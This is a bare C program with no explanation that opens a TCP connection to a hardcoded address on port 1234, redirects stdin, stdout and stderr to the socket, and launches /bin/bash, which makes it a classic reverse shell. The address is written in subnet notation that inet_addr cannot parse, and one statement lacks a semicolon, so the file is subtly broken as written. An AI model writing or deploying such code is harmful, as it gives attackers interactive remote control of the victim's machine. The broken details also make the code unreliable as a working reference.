#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {

    int sockt;
    int port = 1234;
    struct sockaddr_in revsock;

    sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsock.sin_family = AF_INET;
    revsock.sin_port = htons(port);
    revsock.sin_addr.s_addr = inet_addr("192.168.0.0/24");

    connect(sockt, (struct sockaddr *) &revsock,sizeof(revsock));

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL)

    return 0;
}
